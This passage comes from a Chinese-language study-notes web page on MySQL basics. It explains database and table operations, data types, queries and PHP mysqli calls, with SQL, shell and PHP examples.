punctuation\">,</span> dbname<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 都是可选参数，没有就不写。其中只有 port 是 int，其他都是字符串</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/* 套接字（socket）是一种进程间通信机制。当脚本就在服务器上时，使用这个</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>不用经过网络套接字（通过 TCP/IP 协议），而是使用 UNIX 套接字（所以在 windows 系统上，这个参数会被忽略）。*/</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>其实就是不用网络，在本机进程间通信连接</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>注意：这是个指向<span class=\"token operator\">.</span>socket文件的路径</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>所以，如果用这玩意儿，就不用指定port了，可以直接设置为<span class=\"token constant\">null</span></pre></td></tr></table></figure><p>在 PHP8.0 以上，可以使用命名参数来保证正确传参，参数名就是上面那几个</p>\n<p>mysqli_close () 函数来断开与 MySQL 数据库的链接。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>函数定义：<span class=\"token keyword type-declaration\">bool</span> <span class=\"token function\">mysqli_close</span> <span class=\"token punctuation\">(</span> <span class=\"token class-name type-declaration\">mysqli</span> <span class=\"token variable\">$link</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>该函数只有一个参数为 mysqli_connect () 函数创建连接成功后返回的 <strong>MySQL 连接标识符</strong>（mysqli_connect 的返回值）。</p>\n<p>例如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$link</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"database\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败: \"</span><span class=\"token operator\">.</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 执行一些数据库操作</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 显式关闭连接</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 不给参数，就关闭最近打开的一个</span></pre></td></tr></table></figure><h3 id=\"2退出\"><a class=\"anchor\" href=\"#2退出\">#</a> 2. 退出</h3>\n<p><code>EXIT;</code>  或者 <code>QUIT;</code>  或者快捷键 <code>ctrl +D</code></p>\n<h2 id=\"操作数据库\"><a class=\"anchor\" href=\"#操作数据库\">#</a> 操作数据库</h2>\n<h3 id=\"0查看已有数据库\"><a class=\"anchor\" href=\"#0查看已有数据库\">#</a> 0. 查看已有数据库</h3>\n<pre><code class=\"language-mysql\">SHOW DATABASES;\n</code></pre>\n<h3 id=\"1创建\"><a class=\"anchor\" href=\"#1创建\">#</a> 1. 创建</h3>\n<pre><code class=\"language-mysql\">CREATE DATABASE [IF NOT EXISTS] 数据库名;\n如果要指定选项，可以加上其他参数：\nCREATE DATABASE mydatabase\n  CHARACTER SET utf8mb4\n  COLLATE utf8mb4_general_ci;\n指定字符集和排列顺序。\n如果不加IF NOT EXISTS并且存在该数据库，会报错\n</code></pre>\n<h4 id=\"使用-mysqladmin\"><a class=\"anchor\" href=\"#使用-mysqladmin\">#</a> 使用 mysqladmin</h4>\n<p>注：mysqladmin 是个命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysqladmin <span class=\"token parameter variable\">-u</span> your_username <span class=\"token parameter variable\">-p</span> create your_database</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>如果要指定选项，可以加上特定参数：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysqladmin <span class=\"token parameter variable\">-u</span> your_username <span class=\"token parameter variable\">-p</span> create your_database <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  --default-character-set<span class=\"token operator\">=</span>utf8mb4 <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  --default-collation<span class=\"token operator\">=</span>utf8mb4_general_ci</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>作用同上</pre></td></tr></table></figure><p>如果是普通用户，可能要特定权限</p>\n<p>这个命令行可以使用 SQL 的命令：</p>\n<pre><code class=\"language-mysql\">mysqladmin -u your_username -p your_command\n例如：\nmysqladmin -u your_username -p status\n</code></pre>\n<h4 id=\"使用php脚本\"><a class=\"anchor\" href=\"#使用php脚本\">#</a> 使用 PHP 脚本</h4>\n<pre><code class=\"language-mysql\">mysqli_query(connection,query,resultmode);\n也有返回值,也是用于判断是否成功\n</code></pre>\n<p>除了最后一个，都是必须项。</p>\n<p><strong>connection：就是 $connt，也就是 mysqli_connet (...)</strong></p>\n<p>query：查询字符串，也就是 SQL 语句。</p>\n<p>resultmode：这是常量，只能填以下两个之一：</p>\n<p>​\t\t\t\t\t\t MYSQLI_USE_RESULT （检索大量数据时用）</p>\n<p>​\t\t\t\t\t\t MYSQLI_STORE_RESULT （默认）</p>\n<h3 id=\"2删除\"><a class=\"anchor\" href=\"#2删除\">#</a> 2. 删除</h3>\n<pre><code class=\"language-mysql\">DROP DATABASE [IF EXISTS] &lt;database_name&gt;;\n同样，如果不加IF EXISTS，删除不存在的，会报错\n</code></pre>\n<p>// 这是不可逆的</p>\n<h4 id=\"使用-mysqladmin-2\"><a class=\"anchor\" href=\"#使用-mysqladmin-2\">#</a> 使用 mysqladmin</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysqladmin <span class=\"token parameter variable\">-u</span> your_username <span class=\"token parameter variable\">-p</span> drop your_database</pre></td></tr></table></figure><h4 id=\"使用php脚本-2\"><a class=\"anchor\" href=\"#使用php脚本-2\">#</a> 使用 PHP 脚本</h4>\n<p>还是用：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">,</span>query<span class=\"token punctuation\">,</span>resultmode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>显而易见：</p>\n<p>此时的 $query 就是 DROP DATABASE [IF EXISTS] &lt;database_name&gt;;</p>\n<h3 id=\"3选择\"><a class=\"anchor\" href=\"#3选择\">#</a> 3. 选择</h3>\n<h4 id=\"使用命令行\"><a class=\"anchor\" href=\"#使用命令行\">#</a> 使用命令行</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> root -p<span class=\"token punctuation\">;</span> //执行完这个，就会进入mysql提示符</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use <span class=\"token operator\">&lt;</span>database name<span class=\"token operator\">></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">;</span>                   //其他操作命令</pre></td></tr></table></figure><p>use 语句可以换成命令中的 - D 参数，变成：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> your_username <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">-D</span> your_database</pre></td></tr></table></figure><h4 id=\"使用php脚本-3\"><a class=\"anchor\" href=\"#使用php脚本-3\">#</a> 使用 php 脚本</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mysqli_select_db</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">,</span>dbname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 都是必填项</span></pre></td></tr></table></figure><h5 id=\"一个实例\"><a class=\"anchor\" href=\"#一个实例\">#</a> 一个实例</h5>\n<pre><code class=\"language-php+HTML\">&lt;?php\n$dbhost = 'localhost';  // mysql服务器主机地址\n$dbuser = 'root';            // mysql用户名\n$dbpass = '123456';          // mysql用户名密码\n$conn = mysqli_connect($dbhost, $dbuser, $dbpass);\nif(! $conn )\n&#123;\n    die('连接失败: ' . mysqli_error($conn));\n&#125;\necho '连接成功';\nmysqli_select_db($conn, 'RUNOOB' );\nmysqli_close($conn);\n?&gt;\n</code></pre>\n<h2 id=\"数据类型\"><a class=\"anchor\" href=\"#数据类型\">#</a> 数据类型</h2>\n<h3 id=\"数值类型\"><a class=\"anchor\" href=\"#数值类型\">#</a> 数值类型</h3>\n<p>几个不太一样的地方：</p>\n<p>int 分为：tinyint（1Bytes）,smallint（2）,mediumint（3）,int（4）,bigint（8）</p>\n<p>多了一个</p>\n<p><code>DECIMAL</code>  类型，用于表示小数：</p>\n<p>对于 DECIMAL (M,D) ，如果 M&gt;D，为 M+2 否则为 D+2</p>\n<h3 id=\"日期和时间类型\"><a class=\"anchor\" href=\"#日期和时间类型\">#</a> 日期和时间类型</h3>\n<p>DATE （3）：YYYY-MM-DD</p>\n<p>TIME（3）：HH:MM:SS</p>\n<p>YEAR（1）：YYYY</p>\n<p>DATATIME（8）：YYYY-MM-DD hh:mm:ss</p>\n<p>TIMESTAMP（4）：同上   // 这就是时间戳</p>\n<h3 id=\"字符串类型\"><a class=\"anchor\" href=\"#字符串类型\">#</a> 字符串类型</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">类型</th>\n<th style=\"text-align:left\">大小</th>\n<th style=\"text-align:left\">用途</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">CHAR</td>\n<td style=\"text-align:left\">0-255 bytes</td>\n<td style=\"text-align:left\">定长字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">VARCHAR</td>\n<td style=\"text-align:left\">0-65535 bytes</td>\n<td style=\"text-align:left\">变长字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">TINYBLOB</td>\n<td style=\"text-align:left\">0-255 bytes</td>\n<td style=\"text-align:left\">不超过 255 个字符的二进制字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">TINYTEXT</td>\n<td style=\"text-align:left\">0-255 bytes</td>\n<td style=\"text-align:left\">短文本字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">BLOB</td>\n<td style=\"text-align:left\">0-65 535 bytes</td>\n<td style=\"text-align:left\">二进制形式的长文本数据</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">TEXT</td>\n<td style=\"text-align:left\">0-65 535 bytes</td>\n<td style=\"text-align:left\">长文本数据</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">MEDIUMBLOB</td>\n<td style=\"text-align:left\">0-16 777 215 bytes</td>\n<td style=\"text-align:left\">二进制形式的中等长度文本数据</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">MEDIUMTEXT</td>\n<td style=\"text-align:left\">0-16 777 215 bytes</td>\n<td style=\"text-align:left\">中等长度文本数据</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">LONGBLOB</td>\n<td style=\"text-align:left\">0-4 294 967 295 bytes</td>\n<td style=\"text-align:left\">二进制形式的极大文本数据</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">LONGTEXT</td>\n<td style=\"text-align:left\">0-4 294 967 295 bytes</td>\n<td style=\"text-align:left\">极大文本数据</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"others\"><a class=\"anchor\" href=\"#others\">#</a> others</h3>\n<h4 id=\"枚举与集合类型\"><a class=\"anchor\" href=\"#枚举与集合类型\">#</a> 枚举与集合类型</h4>\n<ul>\n<li><strong>ENUM</strong>: 枚举类型，用于存储单一值，可以选择一个预定义的集合。</li>\n<li><strong>SET</strong>: 集合类型，用于存储多个值，可以选择多个预定义的集合。</li>\n</ul>\n<h4 id=\"空间数据类型\"><a class=\"anchor\" href=\"#空间数据类型\">#</a> 空间数据类型</h4>\n<p>GEOMETRY, POINT, LINESTRING, POLYGON, MULTIPOINT, MULTILINESTRING, MULTIPOLYGON, GEOMETRYCOLLECTION: 用于存储空间数据（地理信息、几何图形等）。</p>\n<h2 id=\"使用数据库\"><a class=\"anchor\" href=\"#使用数据库\">#</a> 使用数据库</h2>\n<h3 id=\"0查看已有数据表列\"><a class=\"anchor\" href=\"#0查看已有数据表列\">#</a> 0. 查看已有数据表 / 列</h3>\n<pre><code class=\"language-mysql\">SHOW TABLES; \nSHOW TABLE STATUS;  //这是看表类型（ENGING等）\nSHOW COLUMNS FROM table_name;  //这是看表结构，不是数据\n</code></pre>\n<p>不加 S 的话，要写具体名称或者模糊匹配。 <code>\\G</code>  以竖排显示</p>\n<h3 id=\"1创建数据表\"><a class=\"anchor\" href=\"#1创建数据表\">#</a> 1. 创建数据表</h3>\n<p>必须提供：</p>\n<ul>\n<li>表名</li>\n<li>表字段名</li>\n<li>定义每个表字段的数据类型</li>\n</ul>\n<p>SQL 语法：</p>\n<pre><code class=\"language-mysql\">CREATE TABLE table_name (\n    column1 datatype,\n    column2 datatype,\n    ...\n);\n//column是列名\n</code></pre>\n<p>可以加子句：</p>\n<pre><code class=\"language-mysql\">CREATE TABLE mytable (\n    id INT PRIMARY KEY,\n    name VARCHAR(50)\n) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\n</code></pre>\n<h4 id=\"sql实例\"><a class=\"anchor\" href=\"#sql实例\">#</a> SQL 实例</h4>\n<pre><code class=\"language-mysql\">CREATE TABLE users (\n    id INT AUTO_INCREMENT PRIMARY KEY,\n    username VARCHAR(50) NOT NULL,\n    email VARCHAR(100) NOT NULL,\n    birthdate DATE,\n    is_active BOOLEAN DEFAULT TRUE\n);\n//AUTO_INCREMENT PRIMARY KEY,设定该列自增长(1,2,3...)，且是主键\n（这两者一般同时出现）\n注意：每个表只能有一个 AUTO_INCREMENT 列，必须为整数类型\n\t即使删除了表中最大自增值的记录，下一次插入新记录时，自增值仍然会继续\n\t递增，不会复用已删除的自增值。\n\t起始值默认为1，但可以用`ALTER TABLE users AUTO_INCREMENT = 100;`改\n//NOT NULL，这项必填\n//DEFAULT TRUE，设定默认值为TRUE\n以上三行都是附加的属性\n</code></pre>\n<h4 id=\"通过命令行\"><a class=\"anchor\" href=\"#通过命令行\">#</a> 通过命令行</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> root <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">-D</span> <span class=\"token operator\">&lt;</span>database name<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//接下来进了SQL命令行，当然就是写SQL语句。</pre></td></tr></table></figure><blockquote>\n<p>注意：mySQL 命令行中，回车不是结束， <code>;</code>  才是。</p>\n<p>因此，写不下时可以随意换行</p>\n</blockquote>\n<h4 id=\"通过php脚本\"><a class=\"anchor\" href=\"#通过php脚本\">#</a> 通过 PHP 脚本</h4>\n<p>还是  <code>mysqli_query(connection,query,resultmode);</code></p>\n<h3 id=\"2删除数据表数据\"><a class=\"anchor\" href=\"#2删除数据表数据\">#</a> 2. 删除数据表 [数据]</h3>\n<pre><code class=\"language-mysql\">DROP TABLE [IF EXISTS] table_name; //这是直接删表\nTRUNCATE TABLE table_name;         //这是删表数据（保留结构，数据全删）\nDELETE FROM table_name WHERE condition; //这也是删表数据（保留结构，加条件可不全删）\n注意：TURUNCATE是直接释放数据页的空间，没有详细的删除的日志，因此不能触发任何触发器，也不能事务回滚\n但是更加高效，delete是逐行删除，会触发，能回滚，但更低效\n</code></pre>\n<p>使用命令行和 PHP 脚本，同上</p>\n<h3 id=\"3插入表数据\"><a class=\"anchor\" href=\"#3插入表数据\">#</a> 3. 插入表数据</h3>\n<pre><code class=\"language-mysql\">INSERT INTO table_name (column1, column2, column3, ...)\nVALUES (value1, value2, value3, ...);\n</code></pre>\n<p>//value 若是字符型，要写成 <code>'value'</code></p>\n<p>// 如果插入所有列，可以省略列名。此时第一个要写 NULL, 因为它是那个自增长列的占位符。当然也可以第一行写 0（接下来同理），要不然会变来变去。</p>\n<h4 id=\"插入多行\"><a class=\"anchor\" href=\"#插入多行\">#</a> 插入多行</h4>\n<p>实例：</p>\n<pre><code class=\"language-mysql\">INSERT INTO users (username, email, birthdate, is_active)\nVALUES\n    ('test1', 'test1@runoob.com', '1985-07-10', true),\n    ('test2', 'test2@runoob.com', '1988-11-25', false),\n    ('test3', 'test3@runoob.com', '1993-05-03', true);\n</code></pre>\n<p>使用命令行和 PHP 脚本，同上，这之后的也都是同上</p>\n<p>但是，如果插入的数据中有中文，必须先执行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span> <span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"set names utf8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或者使用<span class=\"token constant\">PHP</span>函数</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mysqli_set_charset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"utf8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 它会同时设置：</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>character_set_client：客户端发送数据时使用的字符编码。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>character_set_results：服务器返回结果集时使用的字符编码。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>character_set_connection：连接层使用的字符编码。</pre></td></tr></table></figure><h4 id=\"获取自增的值\"><a class=\"anchor\" href=\"#获取自增的值\">#</a> 获取自增的值</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$last_id</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_insert_id</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"4修改表数据\"><a class=\"anchor\" href=\"#4修改表数据\">#</a> 4. 修改表数据</h3>\n<p><em>进行重要的结构修改时，建议先备份数据</em></p>\n<pre><code class=\"language-mysql\">UPDATE table_name\nSET column1 = value1, column2 = value2, ...\nWHERE condition;   //where子句可选，没有就会更新所有行\n</code></pre>\n<h4 id=\"替换某个字段中的某个字符\"><a class=\"anchor\" href=\"#替换某个字段中的某个字符\">#</a> 替换某个字段中的某个字符</h4>\n<blockquote>\n<p>当我们需要将字段中的特定字符串批量修改为其他字符串时，可使用以下操作：</p>\n</blockquote>\n<blockquote>\n<pre><code class=\"language-mysql\">UPDATE table_name SET field=REPLACE(field, 'old-string', 'new-string') \n[WHERE Clause];\n</code></pre>\n</blockquote>\n<h3 id=\"5修改表名结构类型\"><a class=\"anchor\" href=\"#5修改表名结构类型\">#</a> 5. 修改表名 / 结构 / 类型</h3>\n<h4 id=\"添加列主键\"><a class=\"anchor\" href=\"#添加列主键\">#</a> 添加列 / 主键</h4>\n<pre><code class=\"language-mysql\">ALTER TABLE table_name\nADD COLUMN new_column_name datatype;\n以及\nALTER TABLE table_name\nADD PRIMARY KEY (column_name);\n以及\nALTER TABLE testalter_tbl ENGINE = MYISAM;\n</code></pre>\n<h4 id=\"添加外键\"><a class=\"anchor\" href=\"#添加外键\">#</a> 添加外键</h4>\n<pre><code class=\"language-mysql\">ALTER TABLE child_table\nADD CONSTRAINT fk_name\nFOREIGN KEY (column_name)           \nREFERENCES parent_table (column_name);\n</code></pre>\n<h4 id=\"修改数据类型\"><a class=\"anchor\" href=\"#修改数据类型\">#</a> 修改数据类型</h4>\n<pre><code class=\"language-mysql\">ALTER TABLE TABLE_NAME\nMODIFY COLUMN column_name new_datatype;\n</code></pre>\n<h4 id=\"修改列表名\"><a class=\"anchor\" href=\"#修改列表名\">#</a> 修改列 / 表名</h4>\n<pre><code class=\"language-mysql\">ALTER TABLE table_name\nCHANGE COLUMN old_column_name new_column_name datatype;\n-- 可以顺手改数据类型\n以及\nALTER TABLE old_table_name\nRENAME TO new_table_name;\n</code></pre>\n<h4 id=\"删除列\"><a class=\"anchor\" href=\"#删除列\">#</a> 删除列</h4>\n<pre><code class=\"language-mysql\">ALTER TABLE table_name\nDROP COLUMN column_name;\n</code></pre>\n<h4 id=\"修改字段类型及名称\"><a class=\"anchor\" href=\"#修改字段类型及名称\">#</a> 修改字段类型及名称</h4>\n<p>可以使用上面的 CHANGE 子句</p>\n<p>也可以用 MODIFY 子句</p>\n<pre><code>ALTER TABLE testalter_tbl MODIFY c CHAR(10);\n等同于\nALTER TABLE testalter_tbl CHANGE c c CHAR(10);\n只不过MODIFY子句不能顺便改名\n</code></pre>\n<p>这两者修改时都可以附带上 NOT NULL，DEFAULT 等</p>\n<p>例如：</p>\n<pre><code class=\"language-mysql\">ALTER TABLE testalter_tbl MODIFY j BIGINT NOT NULL DEFAULT 100;\n</code></pre>\n<h4 id=\"修改删除默认值等\"><a class=\"anchor\" href=\"#修改删除默认值等\">#</a> 修改 / 删除默认值等</h4>\n<pre><code class=\"language-mysql\">ALTER TABLE testalter_tbl ALTER i SET DEFAULT 1000;\n以及\nALTER TABLE testalter_tbl ALTER i DROP DEFAULT/PRIMARY KEY;\n</code></pre>\n<h3 id=\"6读取查询表数据\"><a class=\"anchor\" href=\"#6读取查询表数据\">#</a> 6. 读取 / 查询表数据</h3>\n<h4 id=\"读取\"><a class=\"anchor\" href=\"#读取\">#</a> 读取</h4>\n<pre><code class=\"language-mysql\">select * from 数据表名;   //可以多表`,`分开\n</code></pre>\n<h4 id=\"查询\"><a class=\"anchor\" href=\"#查询\">#</a> 查询</h4>\n<pre><code class=\"language-mysql\">SELECT column1, column2, ...\nFROM table_name                   //可以多表`,`分开\n[WHERE condition]\n[ORDER BY column_name [ASC | DESC]]\n[LIMIT N][offset M];\n</code></pre>\n<ul>\n<li>使用  <code>*</code>  表示选择所有列。</li>\n<li><code>WHERE condition</code>  是一个可选的子句，用于指定过滤条件，只返回符合条件的行。</li>\n<li><code>ORDER BY column_name [ASC | DESC]</code>  可选子句，指定结果集的排序顺序，默认升序（ASC）。</li>\n<li><code>LIMIT N</code>  可选子句，返回 N 条记录</li>\n<li><code>offset N </code> 可选子句，跳过 M 条记录</li>\n</ul>\n<blockquote>\n<p>limit M offset N;</p>\n<p>相当于</p>\n<p>limit N,M;</p>\n</blockquote>\n<h5 id=\"获取数据\"><a class=\"anchor\" href=\"#获取数据\">#</a> 获取数据</h5>\n<h6 id=\"1使用-mysqli_fetch_array-mysqli_assoc\"><a class=\"anchor\" href=\"#1使用-mysqli_fetch_array-mysqli_assoc\">#</a> 1. 使用 mysqli_fetch_array MYSQLI_ASSOC</h6>\n<p><strong>按行获取</strong>，一次只从返回的数据中获取一行</p>\n<p>MYSQLI_ASSOC 是返回<strong>关联数组</strong></p>\n<p>也可以用 MYSQLI_NUM ，返回<strong>数字数组</strong>。区别不大，只不过是把下面的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>r</mi><mi>o</mi><mi>w</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>改成</mtext></mrow><annotation encoding=\"application/x-tex\">row[&#x27;id&#x27;]改成</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0019em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">ro</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7519em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7519em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">改成</span></span></span></span> row [0]</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT id, name, age FROM users\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 使用 mysqli_fetch_array 结合 MYSQLI_ASSOC 获取数据</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">MYSQLI_ASSOC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ID: \"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\", 姓名: \"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\", 年龄: \"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">// 没行了会返回 false</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token 